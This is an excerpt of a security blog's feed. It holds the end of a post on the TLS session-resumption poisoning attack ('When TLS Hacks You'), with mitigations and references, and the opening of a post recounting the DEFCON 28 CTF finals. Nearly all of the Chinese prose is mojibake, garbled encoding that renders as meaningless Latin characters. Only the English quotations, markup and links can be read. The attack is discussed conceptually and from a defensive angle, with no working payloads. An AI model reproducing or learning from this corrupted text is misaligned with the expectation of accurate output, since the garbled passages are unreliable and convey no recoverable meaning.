·çš„æŒ¨ä¸ªå°è¯•å»ºç«‹è¿æ¥åä½¿ç”¨ç¬¬ä¸€ä¸ªè¿æ¥æˆåŠŸçš„ IP çš„ç°è±¡çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸Šæ–‡æåˆ°çš„åŒ A è®°å½•çš„æ–¹å¼æ¥ç»•è¿‡è¯¥ç±»é™åˆ¶ã€‚</p><p>é‚£æ€ä¹ˆåšæ‰æ˜¯æœ€å¥½å‘¢ï¼Ÿä½œè€…åœ¨é˜²å¾¡ç« èŠ‚åšå‡ºäº†è‡ªå·±é˜è¿°ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part3/3.jpg" alt=""></p><p>ä½œè€…å»ºè®®å°† (hostname, port, ip_addr) ä½œä¸ºç¼“å­˜é”®å€¼å¯¹è¿›è¡Œç»‘å®šï¼Œä½†æ˜¯æˆ‘ä¸ªäººè®¤ä¸ºè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼“è§£æªæ–½ï¼Œå› ä¸ºåœ¨å½“ä»Š CDN å¤§æµè¡Œçš„æƒ…å†µä¸‹ï¼Œå¾ˆéš¾è¯´è¿™ä¸ªåŸŸåä¼šä¸€ç›´ä½¿ç”¨åˆ°åŒä¸€ä¸ª IP ï¼Œå¦‚æœå°†åŸŸåã€ç«¯å£ã€IP ä¸‰è€…ç»‘å®šçš„è¯ï¼Œå¯¹äº CDN ä¹‹ç±»çš„æœåŠ¡ä¼šè¯é‡ç”¨æœºåˆ¶æ¶ˆè€—å°†ä¼šå¤§å¤§æå‡ã€‚</p><p>æ‰€ä»¥æˆ‘è§‰å¾—æ›´å¥½çš„åšæ³•åº”è¯¥æ˜¯æ­£å¦‚ Wiki ä¸Šä»‹ç»çš„ï¼Œä½¿ç”¨ IP ä¸å¯¹åº”çš„ç«¯å£è¿›è¡Œç»‘å®š ï¼š</p><blockquote><p>â€‹    The client associates this <em>session id</em> with the serverâ€™s IP address and TCP port, so that when the client connects again to that server, it can use the <em>session id</em> to shortcut the handshake.</p></blockquote><p>ä½¿ç”¨ IP ä¸å¯¹åº”çš„ç«¯å£ä½œä¸ºç¼“å­˜é”®å€¼å¯¹è¿›è¡Œç»‘å®šï¼Œè¿™æ ·çš„è¯å°±ä¸ä¼šå¯¹ CND ä¹‹ç±»çš„æœåŠ¡é€ æˆå¤ªå¤§å½±å“ï¼Œè€Œä¸”ä¹Ÿé™ä½äº†è¢«æ”»å‡»çš„é£é™©ï¼Œå°±ä¸ä¼šå°†é‡ç”¨ä¼šè¯å‘é€åˆ°å…¶ä»– IP ä¸Šäº†ã€‚å½“ç„¶è¿™é‡Œä¹Ÿåªæ˜¯æˆ‘ä¸ªäººç‰‡é¢çš„æƒ³æ³•ï¼Œå¯èƒ½è¿˜æœ‰å¾ˆå¤šè¿™ä¹ˆåšä¼šå—åˆ°å½±å“çš„åœ°æ–¹ï¼Œæ¯”å¦‚è¯´å¯èƒ½ Server å¯¹äº Host åŸŸåæœ‰æ ¡éªŒè€Œæ‹’ç»é‡ç”¨ä¼šè¯ç­‰ç­‰ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œå¯èƒ½å¹¶æ²¡æœ‰ä¸€ä¸ªåå…¨åç¾çš„ç¼“è§£è¯¥æ”»å‡»æ–¹å¼çš„é—®é¢˜ç­‰ç­‰ã€‚</p><p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ç›´æ¥ç¦ç”¨æ‰ TLS ä¼šè¯é‡ç”¨çš„åŠŸèƒ½ï¼Œæœ‰äº› Client ä¸Šå°±æä¾›äº† Disable outbound TLS session resumption çš„è®¾ç½®ï¼ˆé™¤äº† chrome ç­‰å…¶ä»–ä¸€äº›ï¼‰ ï¼š</p><ul><li>libcurl: CURLOPT_SSL_SESSIONID_CACHE=false</li><li>firefox: security.ssl.disable_session_identifiers=true</li><li>Tor browser: disabled by default </li><li>Java, Nodejs, Chrome, others: no option</li></ul><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>æ•´ä¸ªæ¼æ´å¼„ä¸‹æ¥è¿˜æ˜¯éå¸¸æœ‰æ„æ€çš„ï¼Œå°½ç®¡å…¶åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥è¢«æ”»å‡»çš„æœåŠ¡ + Client éœ€è¦æ”¯æŒ TLS Session Resumption + DNS Rebindingï¼ˆä¸‡ä¸€åªæŸ¥è¯¢ä¸€æ¬¡ DNS å°±æ²¡äº†ï¼‰ï¼Œåœ¨å½“ä»Šå…¨æ˜¯ä»æ•°å­¦ç®—æ³•è§’åº¦å» Hack TLS çš„æƒ…å†µä¸‹ï¼Œä½œè€…èƒ½ä»ä¸€ä¸ªæ¯”è¾ƒ Web çš„è§’åº¦æ¥ Hack TLS ï¼Œæˆ‘è§‰å¾—æ˜¯ä¸€ä¸ªéå¸¸ç‹¬åˆ°çš„è§†è§’ï¼Œæ˜¯éå¸¸å€¼å¾—å­¦ä¹ çš„åœ°æ–¹ï¼Œå°¤å…¶æ˜¯è¿™ç§åè®®è®¾è®¡çš„é—®é¢˜ä¸Šã€‚</p><p>è¿˜æœ‰ï¼Œæˆ‘è§‰å¾—ä½œè€…çš„æ ‡é¢˜ä¹Ÿå–çš„å¾ˆæ£’ï¼Œã€ŠWhen TLS Hacks Youã€‹ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³ä¸€ä¸‹ä¸ºä»€ä¹ˆä¸æ˜¯ã€ŠWhen HTTPS Hacks Youã€‹å‘¢ï¼Ÿå–ä¸ªå…³å­ï¼Œå¦‚æœè¿˜æœ‰åç»­çš„è¿›å±•ï¼Œæˆ‘ä¹Ÿä¼šåŒæ­¥åˆ°è‡ªå·±çš„ä¸ªäººåšå®¢ä¸Šï¼Œæ¬¢è¿å…³æ³¨ï¼Œä»¥åŠå‰æ¥äº¤æµï¼š<a href="https://blog.zeddyu.info/">https://blog.zeddyu.info/</a></p><p>ä»¥ä¸Šå°±æ˜¯æœ¬ç¯‡æ–‡ç« çš„å…¨éƒ¨å†…å®¹äº†ï¼Œå¦‚æœå¯¹è¯¥ç¯‡æ–‡ç« æœ‰ä»»ä½•ç–‘é—®æˆ–è€…è´¨ç–‘ï¼Œæ¬¢è¿æ¥ä¿¡ï¼šecho emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d</p><p>æ¬¢è¿å¤§å®¶æŒ‡å‡ºæ–‡ç« çš„é”™è¯¯ï¼Œä¹Ÿæ¬¢è¿å¯¹åè®®å®‰å…¨ç­‰å†…å®¹æ„Ÿå…´è¶£çš„åŒå­¦ä¸€èµ·äº¤æµå­¦ä¹ ï¼</p><h2 id="Acknowledgements"><a href="#Acknowledgements" class="headerlink" title="Acknowledgements"></a>Acknowledgements</h2><p>éå¸¸æ„Ÿè°¢åœ¨æ•´ä¸ªæµç¨‹ä¸­å¸®åŠ©æˆ‘çš„åŒå­¦ã€æœ‹å‹ä»¬ï¼Œç‰¹åˆ«æ„Ÿè°¢ @George åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å¯¹äºæˆ‘è¿™ä¸ªèŒæ–°ä¸è€æˆ‘çƒ¦çš„å¸®åŠ©ï¼Œæ„Ÿè°¢ @Joshua Maddux @zhaojin ç­‰äººåœ¨æ­¤å‰å¯¹è¯¥ç±»å‹æ”»å‡»åšå‡ºçš„è´¡çŒ®ï¼Œæ„Ÿè°¢ @rebirth @chuye å¯¹æœ¬æ–‡çš„ Review æŒ‡å‡ºäº†æœ¬æ–‡ä¹‹å‰ä¸å°‘çš„é”™è¯¯ã€‚</p><p>å¦å¤–æ„Ÿè°¢ä¸€ä¸‹å°ç¼–è´Ÿè´£ä¸”è€å¿ƒçš„ç¼–è¾‘ï¼Œç¼–è¾‘è¿™ä¹ˆé•¿çš„æ–‡ç« çœŸæ˜¯è¾›è‹¦å°ç¼–äº†ã€‚</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Maddux-When-TLS-Hacks-You.pdf" target="_blank" rel="noopener">When TLS Hacks You</a></p><p><a href="https://www.youtube.com/watch?v=qGpAJxfADjo" target="_blank" rel="noopener">DEF CON Safe Mode - Joshua Maddux - When TLS Hacks You</a></p><p><a href="https://github.com/jmdx/TLS-poison" target="_blank" rel="noopener">TLS Poison</a></p><p><a href="https://github.com/ctz/rustls" target="_blank" rel="noopener">rustls</a></p><p><a href="https://tools.ietf.org/html/rfc5246" target="_blank" rel="noopener">RFC 5246: The Transport Layer Security (TLS) Protocol Version 1.2</a></p><p><a href="https://tools.ietf.org/html/rfc5077" target="_blank" rel="noopener">RFC 5077: Transport Layer Security (TLS) Session Resumption without Server-Side State</a></p><p><a href="https://tools.ietf.org/html/rfc8446" target="_blank" rel="noopener">RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3</a></p><p><a href="https://tools.ietf.org/html/rfc3484" target="_blank" rel="noopener">RFC 3484: Default Address Selection for Internet Protocol version 6 (IPv6)</a></p><p><a href="https://tools.ietf.org/html/rfc6724" target="_blank" rel="noopener">RFC 6724: Default Address Selection for Internet Protocol Version 6 (IPv6)</a></p><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security" target="_blank" rel="noopener">Transport Layer Security</a></p><p><a href="https://devcentral.f5.com/s/articles/TLS-Stateful-vs-Stateless-Session-Resumption" target="_blank" rel="noopener">TLS Stateful vs Stateless Session Resumption</a></p><p><a href="https://www.venafi.com/blog/tls-session-resumption" target="_blank" rel="noopener">TLS Session Resumption</a></p><p><a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6d0021002286.htm" target="_blank" rel="noopener">Default destination address selection</a></p><p><a href="https://docs.google.com/presentation/d/1Zq0zMaKh5ONK8twrQc-8cp0b1QuboOm6VHlQl3i315o/edit?usp=sharing" target="_blank" rel="noopener">When TLS hacks you: TLS + SSRF = RCE by ducnt</a></p><p><a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner" target="_blank" rel="noopener">hxp 2020</a></p><p><a href="https://www.zhaoj.in/read-6681.html" target="_blank" rel="noopener">åŸºäº A å’Œ AAAA è®°å½•çš„ä¸€ç§æ–° DNS Rebinding å§¿åŠ¿â€“ä»è¥¿æ¹–è®ºå‰‘2020 Web HelloDiscuzQ é¢˜å¯¹ Blackhat ä¸Šçš„è®®é¢˜åšå‡å</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/10/15/Defcon28final/</id>
        <title><![CDATA[DEFCON 28 Final æ‚è®°]]></title>
        <updated>2021-08-12T09:17:22+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/10/15/Defcon28final/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/10/15/Defcon28final/"><![CDATA[<html><head></head><body><p>è·ç¦» DEFCON 28 Final å·²ç»è¿‡å»äº†ä¸¤ä¸ªå¤šæœˆäº†ï¼Œæœ¬æ¥ç»“æŸå°±å†™å†™ï¼Œä½†æ˜¯å› ä¸ºä¸€äº›åæ¥äº‹è€½æäº†ï¼Œç°åœ¨è¡¥ä¸€ä¸‹è¿™æ¬¡å‚èµ›çš„ä¸€äº›ç»å†ã€‚</p><a id="more"></a><p>[TOC]</p><h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p><strong>å‰è¨€ï¼šæœ¬ç¯‡æ–‡ç« ä¸ä»£è¡¨ä»»ä½•ç»„ç»‡ç¤¾å›¢çš„è§‚ç‚¹ï¼Œå…¨æ–‡ä»…ä»£è¡¨ä¸ªäººçœ‹æ³•ä»¥åŠæ„è§ã€‚å¦‚æœ‰å†’çŠ¯è¯·è”ç³»æˆ‘è¿›è¡Œå¿…è¦çš„ä¿®æ”¹ã€‚</strong></p><p>ç”±äºä»Šå¹´ç–«æƒ…çš„åŸå› ï¼Œä»Šå¹´çš„ DEFCON Final åœ¨çº¿ä¸Šä¸¾åŠï¼Œæˆ‘æœ‰å¹¸ä¸ Tea Deliverers ä¸€èµ·å‚ä¸äº† DEFCON 28 CTF Final ï¼Œæœ€ç»ˆåœ¨æ¯”èµ›ä¸­å–å¾—äº†ç¬¬å››çš„æˆç»©ã€‚æœ¬æ–‡æˆ‘ä¼šä¸»è¦ä»å‚èµ›ç»å†è§é—»ä»¥åŠä¸€äº›å¯¹äº Web é¢˜çš„åˆ†æå…¥æ‰‹æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œç”±äº Web é¢˜è¿‡åˆ†ç®€å•ï¼Œä¹Ÿæ²¡ä»€ä¹ˆç‰¹åˆ«å¥½åˆ†æçš„ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆæŠ€æœ¯è¥å…»ï¼Œå¯ä»¥æƒå½“å°è¯´çœ‹çœ‹ï¼Œåšå›ä¸€ç¬‘ã€‚å¹¶ä¸”ä¸ºäº†é¿å…ä¸€äº›ä¸å¿…è¦çš„éº»çƒ¦ï¼Œå…¨æ–‡æ¶‰åŠåˆ°å§“å ID å¤„æˆ‘éƒ½å°½é‡ä»¥æŸå¸ˆå‚…è¿›è¡Œç§°å‘¼ã€‚</p><h1 id="The-First-DEFCON-Final-In-My-Life"><a href="#The-First-DEFCON-Final-In-My-Life" class="headerlink" title="The First DEFCON Final In My Life"></a>The First DEFCON Final In My Life</h1><h2 id="Simple-Introduction"><a href="#Simple-Introduction" class="headerlink" title="Simple Introduction"></a>Simple Introduction</h2><p>ä»Šå¹´çš„èµ›åˆ¶æˆ‘è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œæƒ³è¯¦ç»†äº†è§£çš„å¯ä»¥å‚è€ƒä¸€ä¸‹å®˜ç½‘:<a href="https://oooverflow.io/dc-ctf-2020-finals/" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/</a></p><p>é¢˜ç›®ä¸»è¦åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œä¸€ç§ç±»å‹æ˜¯ AWD ï¼Œå¦ä¸€ç§æ˜¯ KOH ï¼ŒAWD å°±æ¯”è¾ƒå¸¸è§äº†ï¼Œå°±æ˜¯æ”»é˜²é¢˜ç›®ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦ KOH è¿™ç§é¢˜ç›®ç±»å‹ï¼Œè¿™ç§é¢˜ç›®ç±»å‹å¾€å¾€æ˜¯é¢˜ç›®ä¸­æœ‰è‡ªå·±çš„ä¸€ä¸ªç§¯åˆ†è§„åˆ™ï¼Œç„¶åè®©å„ä¸ªé˜Ÿä¼åœ¨æ¯ä¸ª ROUND å°½å¯èƒ½æ‹¿åˆ°æ›´å¤šçš„åˆ†æ•°ï¼Œæ¯ä¸ª ROUND å–å‰ N åï¼Œæ¯ä¸ª ROUND ç»“æŸç»Ÿè®¡åˆ†æ•°å¹¶ç»™å‰ N åçš„é˜Ÿä¼åœ¨æ€»æ¦œçš„ KOH åˆ—åŠ åˆ†ã€‚åœ¨ KOH ä¸­å¦‚ä½•æ‹¿æ›´å¤šçš„åˆ†æ•°å°±æ˜¯è¿™ä¸ªé¢˜ç›®çš„å‡ºé¢˜ç‚¹äº†ï¼Œè¿™äº›å‡ºé¢˜ç‚¹å¯ä»¥æœ‰ä¸€äº›è®¾ç½®çš„æ¼æ´æˆ–è€…ä»€ä¹ˆå…¶ä»–çš„æ–¹å¼è®©ä½ å¯ä»¥åœ¨ä¸€ä¸ª ROUND å˜é¢å¾—æ›´å¤šçš„åˆ†æ•°ï¼Œç®€å•æ¥è¯´ï¼Œä½ å¯ä»¥ç†è§£ KOH ç»™äº†ä½ ä¸€ä¸ªæ¸¸æˆï¼Œæ¯ä¸ªé˜Ÿä¼æ¯5åˆ†é’Ÿç©ä¸€æŠŠæ¸¸æˆï¼Œä½ å¯ä»¥é€šè¿‡å¯¹æ¸¸æˆåˆ†ææ¥æ‰¾åˆ°ä¸€äº› bug æˆ–è€…ä»€ä¹ˆå…¶ä»–çš„ç‚¹ï¼Œé€šè¿‡è¿™ä¸ªç‚¹æ¥å¸®åŠ©ä½ åƒâ€œå¼€æŒ‚â€ä¸€æ ·å¾—åˆ†ã€‚</p><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><blockquote><p>â€‹    Weâ€™ll start <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=Start+of+DEF+CON+CTF+finals&amp;iso=20200807T05&amp;p1=127" target="_blank" rel="noopener">5 AM Las Vegas time on Friday, August 7th</a> (4 AM for setup).</p><p>Here is the schedule (Nevada time == PDT):</p><ul><li>Shift 1: Friday 4am setup, 5am start, 1pm end</li><li><strong>First public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200807T14&amp;p1=127" target="_blank" rel="noopener">Friday 2 PM</a></strong></li><li>Shift 2: Friday 9pm setup, 10pm start, Saturday 6am end</li><li><strong>Second public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200808T13&amp;p1=127" target="_blank" rel="noopener">Saturday 1 PM</a></strong></li><li>Shift 3: Saturday 2pm setup, 3pm start, 11pm end</li><li>Shift 4: Sunday 7am setup, 8am start, 4pm end</li><li><strong>Third public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200809T12&amp;p1=127" target="_blank" rel="noopener">Sunday at noon</a> (during the game)</strong></li></ul></blockquote><p>è¿™è½®çš„æ—¶é—´å¯è°“æ˜¯ç›¸å½“çš„æ‰€è°“çš„â€œå¥åº·â€äº†ï¼Œä¸Šè¿°æ—¶é—´è¡¨ç¿»è¯‘åˆ°åŒ—äº¬æ—¶é—´è¿‡æ¥å°±æ˜¯ï¼š</p><blockquote><ul><li>Shift 1: Friday 7pm setup, 8pm start, Saturday 4am end</li><li>Shift 2: Saturday 12am setup, 1pm start,  9pm end</li><li>Shift 3: Sunday 5am setup, 6am start, 2pm end</li><li>Shift 4: Sunday 10pm setup, 11pm start, Monday 7am end</li></ul></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æ¯ä¸ª Shift æ¯”èµ›è¿›è¡Œ8å°æ—¶ï¼Œæ¯ä¸ª Shift ä¸­é—´é—´éš”8å°æ—¶ï¼Œè€Œä¸”æ˜¯æ­£æ­£å¥½å¥½çš„8å°æ—¶ =.= è¿™å°±æ˜¯æ‰€è°“çš„â€œå¥åº·â€èµ›åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»æ¯”èµ›åœºåœ°å›å®¶ä¼‘æ¯å†æä¼šæ€ä¹ˆéƒ½æ²¡å‰©å¤šå°‘æ—¶é—´äº†ï¼Œæˆ‘è§‰å¾—è¿˜ä¸å¦‚ç¡¬è‚å¥½äº†ï¼ˆåæ­£æˆ‘è§‰å¾—æ²¡å‡ ä¸ªé˜Ÿåƒæˆ‘è¿™ä¸ªæ··å­ä¸€æ ·8å°æ—¶å…¨ç¡ï¼‰ï¼Œè€Œä¸”è¿˜åˆ†äº†4è½®ï¼Œè¿™æ˜¯çœŸçš„è‚ï¼Œäºæ˜¯é‚£å‡ å¤©æˆ‘çš„ä¸–ç•Œå°±å˜æˆäº†ä¸€å¤©16å°æ—¶çš„ä¸–ç•Œï¼Œ8å°æ—¶çœ‹é¢˜å½“æ··å­ï¼Œ8å°æ—¶ç¡è§‰ã€‚ï¼ˆ</p><h2 id="Stealth-Ports"><a href="#Stealth-Ports" class="headerlink" title="Stealth Ports"></a>Stealth Ports</h2><p>åœ¨ AWD èµ›åˆ¶ä¸­ï¼Œ OOO åŠ å…¥äº† Stealth Ports è¿™ç§æœºåˆ¶ï¼š</p><blockquote><p>â€‹    New this year, each service will have a STEALTH port alongside itâ€™s normal port. The stealth port will be 10000+SERVICE_PORT, so If a challenge listens on port 1337, the stealth port will be 11337. The stealth port hits the same exact challenge endpoint as the normal port, but traffic through that port will not be released to the victim team. But beware: maintaining backdoor access to other teams ainâ€™t cheap! If your team sends any traffic through a serviceâ€™s stealth port to a given team, you will only receive half points for stealing that teamâ€™s flag that round.</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ä¸»åŠæ–¹ç»™å¤§å®¶å¼€æ”¾äº†ä¸€ä¸ªä¸ç»™æµé‡çš„ç«¯å£ï¼Œå¦‚æœæœ‰æ”»å‡»æ–¹æˆåŠŸé€šè¿‡è¿™ä¸ªç«¯å£è·å–åˆ°é˜²å®ˆæ–¹çš„ Flag ï¼Œåˆ™ Flag åˆ†ä¼šå‡åŠã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ç›¸å½“äºä¸€ä¸ªéšå½¢çš„ç«¯å£ï¼Œå¯¹äºä¸€è¡€çš„é˜Ÿä¼æ¯”è¾ƒæœ‰åˆ©ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªç«¯å£è¿…é€Ÿæ‰“å…¨åœºè€Œä¸è¢«æ•è·åˆ°æµé‡ï¼Œä½†æ˜¯å¾—åˆ†ä¼šå‡åŠï¼Œä¹Ÿç®—æ˜¯ä¸€ç§åŒåˆƒå‰‘ã€‚</p><h2 id="Before-Shift-1"><a href="#Before-Shift-1" class="headerlink" title="Before Shift 1"></a>Before Shift 1</h2><p>å¼€å§‹ä¹‹å‰æˆ‘ä¹Ÿå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„å‡†å¤‡ï¼Œç»è¿‡ä¸€ç•ªè®¨è®ºå†³å®šæˆ‘ä»¬è¿˜æ˜¯åœ¨æŸå¸ˆå‚…çš„å…¬å¸é‡Œæ‰“æ¯”èµ›ï¼Œè¿™äº›è®¨è®ºåŒ…æ‹¬ä½†ä¸é™äºæ¯”èµ›åœºåœ°è¦ä¸è¦é€‰ä¸€ä¸ªåˆ«å¢…å•¥çš„ï¼Œä½†æ˜¯è€ƒè™‘åˆ°ç½‘ç»œé—®é¢˜è¿˜æ˜¯å†³å®šäº†åœ¨å…¬å¸é‡Œï¼Œä»¥åŠå¤§å®¶è¦ä¸è¦ä¸€èµ·å…ˆåƒä¸ªé¥­åšä¸ªèµ›å‰åŠ¨å‘˜ä»€ä¹ˆçš„ã€‚æ‰€ä»¥å°±åœ¨å¼€èµ›å‰2å°æ—¶å¤šï¼Œä¹Ÿå°±æ˜¯ä¸‹åˆ5ç‚¹å¤šï¼Œæˆ‘éšæˆ‘ Mentor å°±ä¸€èµ·å»è·Ÿé˜Ÿå‘˜ä»¬åƒäº†ä¸ªé¥­ï¼Œä¹Ÿç®—æ˜¯è·Ÿå¤§å®¶è®¤è¯†è®¤è¯†ï¼Œç„¶åå°±è¢«æ’åœ¨äº† Leader æ—è¾¹åï¼ˆç´§å¼ æ­»äº†ï¼Œæœ‰ç§é¢†å¯¼å¤¹èœæˆ‘è½¬æ¡Œçš„å†²åŠ¨ï¼‰ï¼Œç„¶å Leader æ—è¾¹åˆæ˜¯é‚£ä¸ªç»Ÿæ²»å¼ºç½‘æ¯çš„â€œé‚£ä¸ªç”·äººâ€ï¼ˆåˆç´§å¼ æ­»äº†ï¼Œç¬¬ä¸€æ¬¡è·Ÿè¿™ç§å¯æ€•çš„å·¨å‹å¤§ä½¬ç”Ÿç‰©è¿›è¡Œäº¤æµï¼‰ï¼Œæ•´ä¸ªä¼šé¤å°±è¿™æ ·åœ¨å¯¹äºæˆ‘æ¥è¯´åœ¨ä¸€ç§ä¸å¯åçŠ¶çš„æ°›å›´ä¸‹ç»“æŸäº†ã€‚XDï¼ˆæ„Ÿè§‰å…¶ä»–äººçœŸçš„æ˜¯åˆå¼ºåˆå£®ï¼Œ<small>å°±æˆ‘ä¸€ä¸ªå¯æ€œå¼±å°çš„å°èœé¸¡</small></p><h2 id="Shift-1"><a href="#Shift-1" class="headerlink" title="Shift 1"></a>Shift 1</h2><p>ç”±äºä¹‹å‰æ¥å…¥ç­‰ç­‰å‡†å¤‡å·¥ä½œå¸ˆå‚…ä»¬éƒ½åšå®Œäº†ï¼Œæˆ‘ä¾¿åœ¨ setup å°±å¼€æ··äº†ï¼Œäºæ˜¯å°±å°¬ç­‰æ¯”èµ›å¼€å§‹ã€‚ç¬¬ä¸€å¤©æ”¾äº†è²Œä¼¼ä¸¤ä¸ªäºŒè¿›åˆ¶çš„ AWD ï¼Œè¿˜æœ‰ä¸€ä¸ª KOH ï¼ŒKOH ç»™çš„æ˜¯ä¸€ä¸ª 21 ç‚¹çš„æ¸¸æˆï¼Œè·Ÿæ™®é€šçš„ 21 ç‚¹æ¸¸æˆå·®ä¸å¤šï¼Œæœ‰ä¸€ä¸ªåº„å®¶ï¼Œæ‰€æœ‰é˜Ÿä¼éƒ½è¿›è¡Œä¸‹æ³¨ï¼Œè¦ç‰Œè¶…è¿‡ 21 ç‚¹çš„é˜Ÿä¼å°±åœ¨å½“å‰ ROUND ç›´æ¥å‡ºå±€ï¼Œå‰©ä¸‹çš„é˜Ÿä¼ç»§ç»­è¿›è¡Œæ¸¸æˆï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼å†³å‡ºæ¸¸æˆç§¯åˆ†å‰äº”åï¼Œåœ¨å¯¹åº”é˜Ÿä¼çš„ KOH åˆ†æ•°ä¸Šè¿›è¡ŒåŠ 